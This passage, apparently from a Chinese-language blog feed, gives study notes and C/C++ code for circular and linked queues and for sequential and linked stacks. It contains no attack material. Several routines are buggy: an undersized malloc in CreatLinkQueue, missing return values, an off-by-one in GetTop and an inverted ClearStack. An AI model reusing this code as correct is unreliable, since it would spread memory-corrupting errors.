</span>&#123;<br>    <span class="hljs-keyword">if</span>(rear==front)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    e=*(base+front);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Que::EnQueue</span><span class="hljs-params">(ElemType e)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>((rear+<span class="hljs-number">1</span>)%MAXSIZE==front)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    *(base+rear)=e;<br>    rear=(rear+<span class="hljs-number">1</span>)%MAXSIZE;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Que::DeQueue</span><span class="hljs-params">(ElemType &amp;e)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(rear==front)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    e=*(base+front);<br>    front=(front+<span class="hljs-number">1</span>)%MAXSIZE;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p><code>main.cpp</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;myClass.hpp&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">creatQ</span><span class="hljs-params">(Que &amp;que)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MAXSIZE; ++i) &#123;<br>        que.<span class="hljs-built_in">EnQueue</span>(i + <span class="hljs-number">10</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">printQueue</span><span class="hljs-params">(Que &amp;que)</span> </span>&#123;<br>    <span class="hljs-type">int</span> e;<br>    <span class="hljs-keyword">while</span> (que.<span class="hljs-built_in">GetHead</span>(e)) &#123;<br>        std::cout &lt;&lt;<span class="hljs-string">&quot;Get: &quot;</span>&lt;&lt; e &lt;&lt; std::endl;<br>        que.<span class="hljs-built_in">DeQueue</span>(e);<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;delete: &quot;</span>&lt;&lt;e&lt;&lt;std::endl;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Que queue;<br>    ElemType elemType = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> e;<br>    queue.<span class="hljs-built_in">EnQueue</span>(<span class="hljs-number">244</span>);<br>    std::cout &lt;&lt; queue.<span class="hljs-built_in">QueueLength</span>() &lt;&lt; std::endl;<br>    std::cout &lt;&lt; queue.<span class="hljs-built_in">GetHead</span>(e) &lt;&lt; std::endl;<br>    std::cout &lt;&lt; e &lt;&lt; std::endl;<br>    <span class="hljs-built_in">creatQ</span>(queue);<br>    std::cout &lt;&lt; queue.<span class="hljs-built_in">QueueLength</span>() &lt;&lt; std::endl;<br>    <span class="hljs-built_in">printQueue</span>(queue);<br>    std::cout &lt;&lt; queue.<span class="hljs-built_in">DeQueue</span>(elemType) &lt;&lt; std::endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ol><h3 id="队列链式实现"><a href="#队列链式实现" class="headerlink" title="队列链式实现"></a>队列链式实现</h3><ol><li><p>节点的实现</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E9%98%9F%E5%88%97%E9%93%BE%E5%BC%8F%E7%9A%84%E8%8A%82%E7%82%B9.png"></p></li><li><p>基本定义</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E9%93%BE%E5%BC%8F%E9%98%9F%E5%88%97%E7%9A%84%E5%AE%9A%E4%B9%89.png"></p></li><li><p>代码实例（注意win上面竟然过不了）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OVERFLOW (-1)</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">QNode</span> &#123;</span><br>    ElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">QNode</span> *<span class="hljs-title">next</span>;</span><br>&#125; QNode, *QueuePtr;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LinkQueue</span> &#123;</span><br>    QueuePtr rear;<br>    QueuePtr front;<br>&#125; LinkQueue, *LinkQNode;<br><br>status <span class="hljs-title function_">InitNode</span><span class="hljs-params">(LinkQNode *linkQueue)</span> &#123;<br>    QueuePtr queuePtr = (QNode *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(QNode));<br>    queuePtr-&gt;next = <span class="hljs-literal">NULL</span>;<br>    queuePtr-&gt;data = <span class="hljs-number">0</span>;<br>    (*linkQueue)-&gt;front = queuePtr;<br>    (*linkQueue)-&gt;rear = queuePtr;<br>&#125;<br><br>status <span class="hljs-title function_">DestroyNode</span><span class="hljs-params">(LinkQNode *linkQueue)</span> &#123;<br>    <span class="hljs-keyword">if</span> (*linkQueue == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    QNode *deleteNode = (*linkQueue)-&gt;front;<br>    <span class="hljs-type">int</span> num = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (deleteNode != <span class="hljs-literal">NULL</span>) &#123;<br>        (*linkQueue)-&gt;front = (*linkQueue)-&gt;front-&gt;next;<br>        <span class="hljs-built_in">free</span>(deleteNode);<br>        deleteNode = <span class="hljs-literal">NULL</span>;<br>        deleteNode = (*linkQueue)-&gt;front;<br>        num++;<br>    &#125;<br>    (*linkQueue)-&gt;rear = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">free</span>(*linkQueue);<br>    (*linkQueue)=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, num);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">CreatLinkQueue</span><span class="hljs-params">(LinkQNode *linkQueue)</span> &#123;<br>    (*linkQueue) = (LinkQueue *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(linkQueue));<br>    <span class="hljs-keyword">if</span> ((*linkQueue) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    (*linkQueue)-&gt;front = <span class="hljs-literal">NULL</span>;<br>    (*linkQueue)-&gt;rear = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">GetHead</span><span class="hljs-params">(LinkQNode *linkQNode, ElemType *e)</span> &#123;<br>    *e = (*linkQNode)-&gt;front-&gt;next-&gt;data;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">EnQueue</span><span class="hljs-params">(LinkQNode *linkQNode, ElemType e)</span> &#123;<br>    QNode *qNode = (QNode *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(QNode));<br>    <span class="hljs-keyword">if</span> (qNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    qNode-&gt;data = e;<br>    qNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> ((*linkQNode)-&gt;front == (*linkQNode)-&gt;rear) &#123;<br>        (*linkQNode)-&gt;front-&gt;next = qNode;<br>    &#125;<br>    (*linkQNode)-&gt;rear-&gt;next = qNode;<br>    (*linkQNode)-&gt;rear = qNode;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">DeQueue</span><span class="hljs-params">(LinkQNode *linkQNode, ElemType *e)</span> &#123;<br>    <span class="hljs-keyword">if</span> ((*linkQNode) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    QNode *qNode;<br>    *e = (*linkQNode)-&gt;front-&gt;next-&gt;data;<br>    qNode = (*linkQNode)-&gt;front-&gt;next;<br>    (*linkQNode)-&gt;front-&gt;next = (*linkQNode)-&gt;front-&gt;next-&gt;next;<br>    <span class="hljs-built_in">free</span>(qNode);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    LinkQNode linkQNode;<br>    ElemType e;<br>    CreatLinkQueue(&amp;linkQNode);<br>    InitNode(&amp;linkQNode);<br>    EnQueue(&amp;linkQNode, <span class="hljs-number">1</span>);<br>    EnQueue(&amp;linkQNode, <span class="hljs-number">244</span>);<br>    GetHead(&amp;linkQNode, &amp;e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, e);<br>    DeQueue(&amp;linkQNode, &amp;e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, e);<br>    GetHead(&amp;linkQNode, &amp;e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, e);<br>    DestroyNode(&amp;linkQNode);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构和算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>栈和队列</title>
    <link href="/2023/03/29/%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/"/>
    <url>/2023/03/29/%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="栈和队列"><a href="#栈和队列" class="headerlink" title="栈和队列"></a>栈和队列</h1><h2 id="栈定义和特点"><a href="#栈定义和特点" class="headerlink" title="栈定义和特点"></a>栈定义和特点</h2><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97%E7%9A%84%E7%89%B9%E7%82%B9.png"></p><ol><li>栈：先进后出</li><li>队列：先进先出（排队的问题）</li></ol><h3 id="顺序栈的表示和操作实现"><a href="#顺序栈的表示和操作实现" class="headerlink" title="顺序栈的表示和操作实现"></a>顺序栈的表示和操作实现</h3><ol><li>约定<code>an</code>端为栈顶，<code>a1</code>端为栈底</li></ol><h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><ol><li><p>初始化   制造一个空栈</p><p><code>InitStack(&amp;S)</code></p></li><li><p>销毁栈   </p><p><code>DestroyStack(&amp;S)</code></p></li><li><p>判断是否为空</p><p><code>StackEmpty(S)</code></p></li><li><p>求栈的长度</p><p><code>StackLength(S)</code></p></li><li><p>取栈顶的元素</p><p><code>GetTop(S,&amp;e)</code></p></li><li><p>栈的置空操作</p><p><code>ClearStack(&amp;S)</code></p></li><li><p>入栈操作</p><p><code>Push(&amp;S,e)</code></p></li><li><p>出栈操作</p><p><code>Pop(&amp;S,&amp;e)</code></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%88%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C.png"></p></li></ol><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><ol><li><p>两个指针，一个<code>top</code>指向的是真正的栈顶的上面一个指针，一个<code>base</code>指向的是栈底的地址</p></li><li><p>空栈的标志</p><p><code>top</code>和<code>base</code>都指向的是<code>0</code> </p></li><li><p>栈满的标志</p><p><code>top</code>-<code>base</code>&#x3D;&#x3D;<code>stacksize</code> </p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E9%A1%BA%E5%BA%8F%E6%A0%88%E7%9A%84%E8%A1%A8%E7%A4%BA.png"></p></li><li><p>代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 50</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OVERFLOW (-1)</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SqStack</span>&#123;</span><br>    ElemType* base;<br>    ElemType* top;<br>    <span class="hljs-type">int</span> stackSize;<br>&#125;SqStack;<br><br>status <span class="hljs-title function_">destroyStack</span><span class="hljs-params">(SqStack* sqStack)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sqStack-&gt;base==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-built_in">free</span>(sqStack-&gt;base);<br>    sqStack-&gt;stackSize=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><br>status <span class="hljs-title function_">initStack</span><span class="hljs-params">(SqStack* sqStack)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sqStack==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    sqStack-&gt;base=(ElemType*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span> (ElemType)*MAXSIZE);<br>    <span class="hljs-keyword">if</span>(sqStack-&gt;base==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-built_in">exit</span>(OVERFLOW);<br>    &#125;<br>    sqStack-&gt;top=sqStack-&gt;base;<br>    sqStack-&gt;stackSize=MAXSIZE;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br>status <span class="hljs-title function_">StackEmpty</span><span class="hljs-params">(SqStack sqStack)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sqStack.base==sqStack.top)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">StackLength</span><span class="hljs-params">(SqStack sqStack)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sqStack.base==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">return</span> sqStack.top-sqStack.base;<br>&#125;<br><br>status <span class="hljs-title function_">GetTop</span><span class="hljs-params">(SqStack sqStack,ElemType* e)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sqStack.base==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    *e=*sqStack.top;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">ClearStack</span><span class="hljs-params">(SqStack* sqStack)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sqStack-&gt;base==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    sqStack-&gt;base=sqStack-&gt;top;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">Push</span><span class="hljs-params">(SqStack* sqStack,ElemType e)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sqStack-&gt;base==<span class="hljs-literal">NULL</span>||sqStack-&gt;top-sqStack-&gt;base==sqStack-&gt;stackSize)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    *sqStack-&gt;top++=e;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">Pop</span><span class="hljs-params">(SqStack* sqStack,ElemType* e)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sqStack-&gt;base==<span class="hljs-literal">NULL</span>|| sqStack-&gt;base==sqStack-&gt;top)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    *e=*--sqStack-&gt;top;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">CreatSqStack</span><span class="hljs-params">(SqStack* sqStack)</span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        Push(sqStack,i+<span class="hljs-number">20</span>);<br>    &#125;<br>&#125;<br><br>status <span class="hljs-title function_">printfStack</span><span class="hljs-params">(SqStack* sqStack)</span>&#123;<br>    <span class="hljs-keyword">if</span>(*sqStack-&gt;base==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-type">int</span> tem;<br>    <span class="hljs-keyword">while</span>(StackLength(*sqStack)&gt;<span class="hljs-number">0</span>)&#123;<br>        Pop(sqStack,&amp;tem);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, tem);<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    SqStack sqStack;<br>    sqStack.base=<span class="hljs-literal">NULL</span>;<br>    initStack(&amp;sqStack);<br>    CreatSqStack(&amp;sqStack);<br>    printfStack(&amp;sqStack);<br>    destroyStack(&amp;sqStack);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ol><h3 id="栈链的表示和实现"><a href="#栈链的表示和实现" class="headerlink" title="栈链的表示和实现"></a>栈链的表示和实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 50</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OVERFLOW (-1)</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SqStack</span>&#123;</span><br>    ElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SqStack</span>* <span class="hljs-title">next</span>;</span><br>&#125;StackNode,*LinkStack;<br><br><br>status <span class="hljs-title function_">InitStack</span><span class="hljs-params">(LinkStack* linkStack)</span>&#123;<br>    <span class="hljs-comment">//构造空栈</span><br>    *linkStack=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br>status <span class="hljs-title function_">StackEmpty</span><span class="hljs-params">(LinkStack linkStack)</span>&#123;<br>    <span class="hljs-keyword">if</span>(linkStack==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>status <span class="hljs-title function_">Push</span><span class="hljs-params">(LinkStack* linkStack,ElemType e)</span>&#123;<br>    StackNode* temNode=(StackNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(StackNode));<br>    temNode-&gt;data=e;<br>    <span class="hljs-comment">//如果是第一个元素，下面代码指向的NULL</span><br>    temNode-&gt;next=(*linkStack);<br>    (*linkStack)=temNode;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br>status <span class="hljs-title function_">Pop</span><span 